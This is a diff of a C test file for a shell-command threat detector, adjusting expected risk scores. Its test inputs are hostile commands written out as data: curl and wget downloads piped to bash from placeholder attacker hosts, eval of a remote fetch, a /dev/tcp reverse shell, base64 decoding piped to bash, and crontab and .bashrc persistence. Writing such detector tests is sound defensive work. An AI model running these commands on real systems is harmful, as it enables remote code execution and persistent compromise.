@@ -45,70 +45,76 @@ int main(void) {
     // Test 2: Simple download
     test_command(&detector, &mock_device, "Download Command (curl)",
                  "curl http://example.com/file.txt",
-                 15);
+                 20);  // 2.0 × 1.0 × 10 = 20
 
     // Test 3: wget download
     test_command(&detector, &mock_device, "Download Command (wget)",
                  "wget http://example.com/file.zip",
-                 15);
+                 20);  // 2.0 × 1.0 × 10 = 20
 
     // Test 4: Piped download (like Docker/Rust installers - legitimate pattern!)
     test_command(&detector, &mock_device, "Piped Download (like curl https://get.docker.com | sh)",
                  "curl http://malicious.com/payload.sh | bash",
-                 50);
+                 50);  // 5.0 × 1.0 × 10 = 50
 
     // Test 5: Piped download variant
     test_command(&detector, &mock_device, "wget Piped to Shell",
                  "wget -O- http://bad.com/script.sh | sh",
-                 50);
+                 50);  // 5.0 × 1.0 × 10 = 50
 
-    // Test 6: Base64 obfuscation
-    test_command(&detector, &mock_device, "Base64 Decode Obfuscation",
+    // Test 6: Base64 decode without piping
+    test_command(&detector, &mock_device, "Base64 Decode (benign - no pipe to shell)",
+                 "echo ZWNobyBtYWxpY2lvdXMK | base64 -d",
+                 0);
+
+    // Test 7: Base64 decode with piping to shell
+    test_command(&detector, &mock_device, "Base64 Decode Obfuscation (piped to bash)",
                  "echo ZWNobyBtYWxpY2lvdXMK | base64 -d | bash",
-                 45);
+                 65);  // 6.5 × 1.0 × 10 = 65
 
-    // Test 7: Eval with command substitution
+    // Test 8: Eval with command substitution
     test_command(&detector, &mock_device, "Eval Command Substitution",
                  "eval $(curl http://attacker.com/cmd)",
-                 75);
+                 80);  // 8.0 × 1.0 × 10 = 80
 
-    // Test 8: Reverse shell - ALWAYS malicious
+    // Test 9: Reverse shell
     test_command(&detector, &mock_device, "Reverse Shell Pattern",
                  "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-                 100);
+                 150);
 
-    // Test 9: Chmod + execute
+    // Test 10: Chmod + execute
     test_command(&detector, &mock_device, "Execution Pattern",
                  "chmod +x malware.sh && ./malware.sh",
-                 20);
+                 30);  // 3.0 × 1.0 × 10 = 30
 
-    // Test 10: Crontab persistence
+    // Test 11: Crontab persistence
     test_command(&detector, &mock_device, "Crontab Persistence",
                  "crontab -e",
-                 50);
+                 70);  // 7.0 × 1.0 × 10 = 70
 
-    // Test 11: Bashrc persistence
+    // Test 12: Bashrc persistence
     test_command(&detector, &mock_device, "Bashrc Persistence",
                  "echo malicious code >> ~/.bashrc",
-                 50);
+                 70);  // 7.0 × 1.0 × 10 = 70
 
-    // Test 12: Command chaining
+    // Test 13: Command chaining
     test_command(&detector, &mock_device, "Excessive Command Chaining",
                  "cat file | grep pattern | sed 's/a/b/' | awk '{print $1}' | sort",
-                 15);
+                 25);  // 2.5 × 1.0 × 10 = 25
 
-    // Test 13: Complex attack chain (without fast timing)
+    // Test 14: Complex attack chain (without fast timing)
+    // Highest severity: persistence (7.0)
     test_command(&detector, &mock_device, "Full Attack Chain (no timing)",
                  "curl http://evil.com/payload.sh | bash && chmod +x backdoor && ./backdoor && echo persist >> ~/.bashrc",
-                 120);
+                 70);  // persistence (7.0) wins, floor enforced
 
-    // Test 14: Multi-stage attack (without fast timing)
+    // Test 15: Multi-stage attack (without fast timing)
+    // Highest severity: persistence (7.0)
     test_command(&detector, &mock_device, "Multi-Stage Attack (no timing)",
                  "wget http://attacker.com/script.sh && chmod +x script.sh && ./script.sh && crontab -e",
-                 85);
+                 70);  // persistence (7.0) wins, floor enforced
 
-    printf(YELLOW "\n\nTesting complete!\n" RESET);
-
+    printf(YELLOW "\n\nTesting complete!\n");
 
     return 0;
 }
